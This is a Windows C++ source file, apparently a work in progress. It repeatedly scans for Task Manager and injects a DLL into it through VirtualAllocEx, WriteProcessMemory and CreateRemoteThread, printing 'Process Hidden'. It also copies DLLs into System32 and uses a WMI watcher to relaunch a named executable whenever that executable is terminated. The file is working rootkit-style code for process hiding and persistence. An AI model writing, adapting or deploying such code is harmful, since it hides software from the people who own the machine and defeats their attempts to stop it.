#include <WinUser.h>
#include "stdafx.h"
#include "eventsink.h"
#include "ProcessMon.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <direct.h>
#include <AclAPI.h>
#include <sddl.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

using namespace std;
HANDLE map;
LPVOID buf;

class CStartMon : public CProcessMon
{
	void Log(char* sMsg)
    {
        /*SYSTEMTIME LocalTime; 
        GetLocalTime(&LocalTime); 
 
        char szDate[1024];
        ZeroMemory(szDate, 1024);
 
        sprintf(szDate, "[%04d-%02d-%02d %02d:%02d:%02d]",  
                LocalTime.wYear, LocalTime.wMonth,
                LocalTime.wDay, LocalTime.wHour,
                LocalTime.wMinute, LocalTime.wSecond); 
 
        printf("%s %s\n", szDate, sMsg);*/

        string path = getenv("TMP");
        path += "\\Bala";
        _mkdir(path.c_str());
        path += "\\restarted.log";

        ofstream logfile(path);
        if (logfile)
            logfile.close();
    }

	void OnCreate()
	{
		char szMSG[1024];
        ZeroMemory(szMSG, 1024);
		sprintf(szMSG, "[%s] Executed!!", this->m_szProcessName);

        //Log(szMSG);
	};

	void OnDelete() // here .. you did 
	{
        char szMSG[1024];
        ZeroMemory(szMSG, 1024);
		sprintf(szMSG, "[%s] Terminated!!", this->m_szProcessName);

		//Log(szMSG);

		//system("balaTestServiceFinal.exe"); // what is this ? - 
		system("D:\\Bala-Test-service\\balaTestServiceFinal.exe");  // here ...
	};
};

bool inject_dll(DWORD pid, string dll_path) {

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE) {
		cout << " [-] Open Process Failed" << endl;
		return false;
	}
	else { cout << " [+] Got a Handle to the Remote Process" << endl; }

	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		cout << " [-] VirtualAllocEx Failed" << endl;
		return false;
	}

	BOOL res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res) {
		cout << " [-] WriteProcessMemory Failed" << endl;
	}
	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) == INVALID_HANDLE_VALUE) {
		cout << " [-] CreateRemoteThread Failed" << endl;
	}
	else { cout << " [+] DLL Loaded Into Remote Process" << endl; }

	cout << " [+] Process Hidden" << endl << endl;
	CloseHandle(handle);
	return true;
}

void find_and_inject()
{
	DWORD lastpid = 4;
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);

	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of('\\');
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\SLoader64.dll");

	//cout << dll_path.c_str() << endl;

	while (true)
	{
		// Keep running to check if TM closes and reopens, if yes then inject again
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap == INVALID_HANDLE_VALUE)
		{
			cout << " [-] CreateToolhelp32Snapshot Failed" << endl;
			return;
		}

		if (!Process32First(proc_snap, &process))
		{
			cout << " [-] Process32First Failed" << endl;
			return;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, L"Taskmgr.exe") && lastpid != process.th32ProcessID)
			{
				cout << " [+] Task Manager Detected" << endl;
				if (!inject_dll(process.th32ProcessID, dll_path))
				{
					cout << " [-] Unable to Inject DLL!! Check if you are running as Admin" << endl << endl;
					break;
				}
				lastpid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}

bool map_process_name(string process)
{
	map = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		255,
		"Global\\GetProcessName"
	);

	if (map == NULL) {
		cout << "CreateFileMapping Failed" << endl;
		return false;
	}

	buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255);

	if (buf == NULL) {
		cout << "MapViewOfFile Failed" << endl;
		CloseHandle(map);
		return 0;
	}

	CopyMemory(buf, process.c_str(), process.length());

	return true;
}

void CopyLib()
{
	CopyFile(L"Lib\\hproc64.dll", L"C:\\Windows\\System32\\hproc64.dll", 1);
	CopyFile(L"Lib\\mfc140u.dll", L"C:\\Windows\\System32\\mfc140u.dll", 1);
	CopyFile(L"Lib\\msvcp140.dll", L"C:\\Windows\\System32\\msvcp140.dll", 1);
	CopyFile(L"Lib\\vcruntime140.dll", L"C:\\Windows\\System32\\vcruntime140.dll", 1);
	CopyFile(L"Lib\\vcruntime140_1.dll", L"C:\\Windows\\System32\\vcruntime140_1.dll", 1);
}

int main(int iArgCnt, char ** argv)
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	//start of WMI lets have method to copy dll from source path to destination path .. this goes after hiding exe ...  to execute this line we dont need hproc64.dll i presume ?
	//copyMethod()
	//copy library folder of WMI.exe to c:sys32  after
	CopyLib();

	//from here its normal and bythis step hprocdll already would have copied so ..
	CreateThread(
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)find_and_inject, ////from here its normal and bythis step hprocdll already would have copied so ..it should work 
		NULL,
		NULL,
		NULL
	);

	/*while (true)
	{
		Sleep(500);
	}*/

	CStartMon c;
	
	if (c.StartWatching("balaTestServiceFinal.exe"))
		printf("Fail to create WMI.\n");

	system("D:\\Bala-Test-service\\balaTestServiceFinal.exe"); // this line where we watch exe? and what exe right ? 

	getchar();

	return 0;
}
